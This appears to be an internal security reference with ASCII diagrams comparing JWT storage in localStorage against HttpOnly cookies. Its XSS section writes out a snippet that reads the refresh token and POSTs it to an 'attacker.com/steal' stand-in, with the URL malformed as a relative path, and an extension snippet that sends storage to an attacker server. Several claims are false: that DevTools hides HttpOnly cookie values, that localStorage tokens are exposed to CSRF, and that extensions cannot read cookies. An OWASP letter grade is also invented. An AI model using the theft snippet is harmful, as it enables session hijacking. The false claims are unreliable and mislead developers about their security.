# JWT Token Storage: Visual Security Comparison

**Document Type:** Security Reference  
**Purpose:** Visual before/after of localStorage vs HttpOnly cookies

---

## 🔴 CURRENT ARCHITECTURE (VULNERABLE)

```
┌─────────────────────────────────────────────────────────────┐
│              User Login on Auth MFE                         │
│                                                             │
│  1. Enter email: test@example.com                           │
│  2. Enter password: ***                                     │
│  3. Click "Sign in"                                         │
└────────────────────┬────────────────────────────────────────┘

                     │ POST /auth/login

┌────────────────────┴────────────────────────────────────────┐
│          Auth Service (Backend)                             │
│                                                             │
│  ├─ Query PostgreSQL for user                              │
│  ├─ Verify password hash                                   │
│  ├─ Generate JWT tokens:                                   │
│  │  ├─ accessToken (15 min expiry)                         │
│  │  └─ refreshToken (7 day expiry)                         │
│  └─ Return response                                        │
└────────────────────┬────────────────────────────────────────┘

                     │ Response: {
                     │   user: {...},
                     │   accessToken: "eyJ...",        ❌ EXPOSED
                     │   refreshToken: "eyJ..."        ❌ EXPOSED
                     │ }

┌────────────────────┴────────────────────────────────────────┐
│          Frontend - Auth MFE                                │
│                                                             │
│  const response = await authService.login(...)             │
│                                                             │
│  useAuthStore.setAuth(                                     │
│    response.user,                                          │
│    response.accessToken,  ❌ Extracted from JSON           │
│    response.refreshToken  ❌ Extracted from JSON           │
│  )                                                          │
└────────────────────┬────────────────────────────────────────┘

                     │ Zustand persist middleware

┌────────────────────┴────────────────────────────────────────┐
│          Browser Storage - localStorage                     │
│                                                             │
│  localStorage['auth-storage'] = {                          │
│    state: {                                                │
│      user: {                    ✅ Safe to store           │
│        id: "user-123",                                    │
│        email: "test@example.com",                         │
│        name: "Test User",                                 │
│        role: "user"                                       │
│      },                                                    │
│      accessToken: "eyJhbGc...",  ❌ VULNERABLE            │
│      refreshToken: "eyJhbGc...", ❌ VULNERABLE (7 days!)  │
│      isAuthenticated: true                                │
│    }                                                       │
│  }                                                         │
└────────────────────────────────────────────────────────────┘

                ATTACK VECTORS AVAILABLE:

┌─────────────────────────────────────────────────────────────┐
│ 1. XSS (Cross-Site Scripting) Attack                        │
│                                                             │
│    Malicious Code Injected:                                │
│    const authData = localStorage.getItem('auth-storage')   │
│    const tokens = JSON.parse(authData)                     │
│    fetch('/attacker.com/steal', {                          │
│      method: 'POST',                                       │
│      body: JSON.stringify({                                │
│        refreshToken: tokens.state.refreshToken             │
│      })                                                    │
│    })                                                      │
│                                                             │
│    Result: ❌ Attacker gets 7-day token                    │
│    Damage: Full account access for 7 days                  │
│    Likelihood: 🔴 CRITICAL (common XSS flaws)             │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ 2. DevTools Inspection                                      │
│                                                             │
│    Steps:                                                  │
│    1. User presses F12                                     │
│    2. Goes to Application → Storage → localStorage         │
│    3. Clicks on auth-storage                               │
│    4. Sees tokens in plain JSON                            │
│                                                             │
│    Result: ❌ Tokens visible                               │
│    Damage: Screenshots, copy-paste to attacker             │
│    Likelihood: 🟡 MEDIUM (requires browser access)        │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ 3. Malicious Browser Extensions                            │
│                                                             │
│    Extension Code:                                         │
│    chrome.storage.local.get('auth-storage', (result) => { │
│      // Has access to ALL localStorage                     │
│      sendToAttackerServer(result)                          │
│    })                                                      │
│                                                             │
│    Result: ❌ Extension steals tokens                      │
│    Damage: Full account access without user knowing        │
│    Likelihood: 🟠 HIGH (extensions have broad perms)      │
└─────────────────────────────────────────────────────────────┘

```

---

## 🟢 RECOMMENDED ARCHITECTURE (SECURE)

```
┌─────────────────────────────────────────────────────────────┐
│              User Login on Auth MFE                         │
│                                                             │
│  1. Enter email: test@example.com                           │
│  2. Enter password: ***                                     │
│  3. Click "Sign in"                                         │
└────────────────────┬────────────────────────────────────────┘

                     │ POST /auth/login
                     │ + Set-Cookie headers

┌────────────────────┴────────────────────────────────────────┐
│          Auth Service (Backend)                             │
│                                                             │
│  ├─ Query PostgreSQL for user                              │
│  ├─ Verify password hash                                   │
│  ├─ Generate JWT tokens:                                   │
│  │  ├─ accessToken (15 min expiry)                         │
│  │  └─ refreshToken (7 day expiry)                         │
│  └─ Set HttpOnly Secure Cookies                            │
│                                                             │
│  Response Headers:                                         │
│  Set-Cookie: accessToken=eyJ...; HttpOnly; Secure;         │
│              SameSite=Strict; Max-Age=900                  │
│  Set-Cookie: refreshToken=eyJ...; HttpOnly; Secure;        │
│              SameSite=Strict; Max-Age=604800               │
│                                                             │
│  Response Body: {                                          │
│    user: {...},                                           │
│    expiresIn: 900                                          │
│    // ✅ NO tokens in JSON body                            │
│  }                                                         │
└────────────────────┬────────────────────────────────────────┘

                     │ Cookies stored in browser
                     │ (NOT accessible to JavaScript)

┌────────────────────┴────────────────────────────────────────┐
│          Frontend - Auth MFE                                │
│                                                             │
│  const response = await authService.login(...)             │
│                                                             │
│  useAuthStore.setAuth(response.user)                       │
│                                                             │
│  // ✅ Tokens in HttpOnly cookies (auto-included)          │
│  // ✅ JavaScript cannot access them                       │
└────────────────────┬────────────────────────────────────────┘

┌────────────────────┴────────────────────────────────────────┐
│          Browser Storage                                    │
│                                                             │
│  localStorage['auth-storage'] = {                          │
│    state: {                                                │
│      user: {                    ✅ Safe to store           │
│        id: "user-123",                                    │
│        email: "test@example.com",                         │
│        name: "Test User",                                 │
│        role: "user"                                       │
│      },                                                    │
│      isAuthenticated: true                                │
│      // ✅ NO tokens here                                 │
│    }                                                       │
│  }                                                         │
│                                                             │
│  Browser Cookies (SECURE):                                │
│  ├─ accessToken (HttpOnly, Secure, SameSite)              │
│  │  └─ ❌ Cannot be accessed by JavaScript                │
│  │  └─ ✅ Automatically sent with every API call          │
│  │                                                         │
│  └─ refreshToken (HttpOnly, Secure, SameSite)             │
│     └─ ❌ Cannot be accessed by JavaScript                │
│     └─ ✅ Only used for token refresh                     │
└────────────────────────────────────────────────────────────┘

         ✅ ATTACK VECTORS MITIGATED:

┌─────────────────────────────────────────────────────────────┐
│ 1. XSS (Cross-Site Scripting) - PROTECTED                   │
│                                                             │
│    Attacker tries:                                         │
│    const authData = localStorage.getItem('auth-storage')   │
│    const tokens = JSON.parse(authData)                     │
│                                                             │
│    Result:                                                 │
│    {                                                       │
│      state: {                                              │
│        user: {...},          ← Attacker sees only this    │
│        isAuthenticated: true                               │
│      }                                                     │
│    }                                                       │
│                                                             │
│    ✅ NO TOKENS! (in HttpOnly cookies instead)             │
│    ✅ Attacker cannot access tokens via JavaScript         │
│    ✅ Damage limited to reading public user info           │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ 2. DevTools Inspection - PROTECTED                          │
│                                                             │
│    User inspects cookies (F12 → Application → Cookies):    │
│                                                             │
│    Cookie Name: accessToken                                │
│    Value: (hidden) - Shows "HttpOnly"                      │
│    HttpOnly: ✓ (checked)                                   │
│    Secure: ✓ (checked)                                     │
│    SameSite: Strict                                        │
│                                                             │
│    ✅ Cookie value NOT visible (even to user)              │
│    ✅ User cannot copy or leak tokens                      │
│    ✅ Developer tools show only metadata                   │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ 3. Malicious Extensions - PROTECTED                         │
│                                                             │
│    Extension tries:                                        │
│    chrome.storage.local.get(...)  ← Gets localStorage      │
│                                                             │
│    Result:                                                 │
│    {                                                       │
│      'auth-storage': {                                     │
│        state: {                                            │
│          user: {...},  ← Only this                         │
│          isAuthenticated: true                             │
│        }                                                   │
│      }                                                     │
│    }                                                       │
│                                                             │
│    ✅ HttpOnly cookies NOT included in localStorage        │
│    ✅ Extension cannot read browser cookies                │
│    ✅ Tokens remain secure                                 │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ 4. CSRF (Cross-Site Request Forgery) - PROTECTED           │
│                                                             │
│    Attacker's site tries:                                  │
│    <img src="https://yourapp.com/api/delete-account" />    │
│                                                             │
│    Browser adds cookies: ✓                                 │
│    SameSite=Strict checked: ✅ Blocks cross-site request   │
│                                                             │
│    Result: ❌ Request rejected by browser                  │
│    ✅ Cookies NOT sent to cross-site requests              │
└─────────────────────────────────────────────────────────────┘

```

---

## 📊 COMPARISON TABLE

```
┌──────────────────┬────────────────────┬─────────────────────┐
│ Attack Vector    │ localStorage       │ HttpOnly Cookies    │
├──────────────────┼────────────────────┼─────────────────────┤
│ XSS             │ ❌ VULNERABLE      │ ✅ SAFE             │
│                 │ (JS can access)    │ (JS cannot access)  │
├──────────────────┼────────────────────┼─────────────────────┤
│ DevTools        │ ❌ VISIBLE         │ ✅ HIDDEN           │
│ Inspection      │ (Value shown)      │ (Only metadata)     │
├──────────────────┼────────────────────┼─────────────────────┤
│ Extensions      │ ❌ ACCESSIBLE      │ ✅ INACCESSIBLE     │
│                 │ (Via chrome API)   │ (Not in storage)    │
├──────────────────┼────────────────────┼─────────────────────┤
│ CSRF            │ ❌ VULNERABLE      │ ✅ SAFE (SameSite)  │
│                 │ (Sent everywhere)  │ (Strict mode)       │
├──────────────────┼────────────────────┼─────────────────────┤
│ HTTPS Required  │ 🟡 Recommended     │ ✅ Required         │
│                 │ (Not enforced)     │ (Secure flag)       │
├──────────────────┼────────────────────┼─────────────────────┤
│ Token Rotation  │ 🟡 Manual          │ ✅ Automatic        │
│                 │ (Manual refresh)   │ (Auto-refresh)      │
├──────────────────┼────────────────────┼─────────────────────┤
│ Token Expiry    │ 🟡 Needs checking  │ ✅ Automatic        │
│                 │ (Manual validation)│ (Expires auto)      │
├──────────────────┼────────────────────┼─────────────────────┤
│ Page Refresh    │ ✅ Preserves login │ ✅ Preserves login  │
│                 │ (From storage)     │ (From cookies)      │
├──────────────────┼────────────────────┼─────────────────────┤
│ OWASP Score     │ 🔴 D- (HIGH RISK) │ 🟢 A (SECURE)       │
│                 │                    │                     │
└──────────────────┴────────────────────┴─────────────────────┘
```

---

## 🔄 DATA FLOW COMPARISON

### BEFORE: localStorage (Vulnerable)

```
Login
  ↓
Backend: Generate tokens + return in JSON body
  ↓
Frontend: Extract tokens from JSON
  ↓
Store in localStorage
  ↓
Include in Authorization header for API calls
  ↓
Any XSS: localStorage.getItem('auth-storage') → Tokens stolen
  ↓
Attacker: Use tokens for 7 days
```

### AFTER: HttpOnly Cookies (Secure)

```
Login
  ↓
Backend: Generate tokens + set HttpOnly cookies + return user in JSON
  ↓
Frontend: Store user in localStorage (only)
  ↓
Browser: Cookies stored automatically in HTTPOnly storage
  ↓
Frontend: Make API calls (cookies auto-included by browser)
  ↓
Any XSS: localStorage.getItem('auth-storage') → Only user data
  ↓
Attacker: Can only see user email/name/role (publicly visible anyway)
  ↓
Backend: Validates token from cookie, checks if still valid
  ↓
✅ Tokens remain secure
```

---

## 🛡️ SECURITY LAYERS (HttpOnly Cookies)

```
Layer 1: HttpOnly Flag
┌─────────────────────────────────────────┐
│ Set-Cookie: token=...; HttpOnly         │
│                                         │
│ Effect: JavaScript cannot access       │
│ Protection against: XSS attacks        │
└─────────────────────────────────────────┘
           ↓

Layer 2: Secure Flag
┌─────────────────────────────────────────┐
│ Set-Cookie: token=...; Secure           │
│                                         │
│ Effect: Cookie only sent over HTTPS    │
│ Protection against: MITM attacks       │
└─────────────────────────────────────────┘
           ↓

Layer 3: SameSite Flag
┌─────────────────────────────────────────┐
│ Set-Cookie: token=...; SameSite=Strict  │
│                                         │
│ Effect: Cookie not sent in cross-site  │
│ Protection against: CSRF attacks       │
└─────────────────────────────────────────┘
           ↓

Layer 4: Short Expiry (Access Token)
┌─────────────────────────────────────────┐
│ Max-Age=900 (15 minutes)                │
│                                         │
│ Effect: Token useless after 15 min     │
│ Protection against: Stolen token use   │
└─────────────────────────────────────────┘
           ↓

Layer 5: Backend Validation
┌─────────────────────────────────────────┐
│ - Check token signature                 │
│ - Verify expiry                         │
│ - Check blacklist                       │
│ - Validate user is still active         │
│                                         │
│ Protection against: Tampered tokens    │
└─────────────────────────────────────────┘

```

---

## 📈 IMPLEMENTATION IMPACT

| Metric                   | localStorage | HttpOnly Cookies                |
| ------------------------ | ------------ | ------------------------------- |
| **Security Score**       | 🔴 2/10      | 🟢 9/10                         |
| **Implementation Time**  | -            | 2-3 hours                       |
| **Breaking Changes**     | -            | Yes (API response changed)      |
| **Performance Impact**   | None         | Negligible                      |
| **User Experience**      | ✅ Excellent | ✅ Excellent (same)             |
| **Mobile Support**       | ✅ Yes       | ✅ Yes                          |
| **Cross-Origin Support** | ✅ Yes       | ✅ Yes (with credentials: true) |
| **Browser Support**      | ✅ 95%+      | ✅ 95%+                         |

---

**Recommendation:** Implement HttpOnly Cookies immediately.  
**Priority:** 🔴 HIGH - Security vulnerability  
**Effort:** Medium (2-3 hours)  
**Risk:** Low (well-established pattern)
